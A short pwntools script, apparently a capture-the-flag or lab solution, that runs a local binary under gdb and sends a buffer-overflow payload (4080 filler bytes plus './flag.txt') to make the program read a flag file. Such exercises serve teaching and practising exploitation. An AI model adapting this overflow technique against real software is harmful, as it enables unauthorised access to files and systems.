from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "split-window", "-h"]

io = gdb.debug(
    "./bin/ex1",
    """
    b ex1.c:64
    continue
    """,
)

io.sendline(b"1")
io.sendline(b"A"*4080 + b"./flag.txt\0")
io.sendline(b"2")
io.interactive()

